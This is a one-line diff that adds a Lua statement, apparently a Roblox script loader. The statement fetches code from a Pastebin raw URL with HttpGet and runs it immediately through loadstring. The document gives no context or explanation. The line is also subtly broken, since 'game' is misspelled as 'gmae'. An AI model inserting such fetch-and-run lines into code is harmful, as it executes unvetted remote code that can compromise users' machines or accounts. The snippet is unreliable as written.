@@ -1,0 +1,1 @@
+loadstring(gmae:HttpGet("https://pastebin.com/raw/ze7tMFfw"))() 
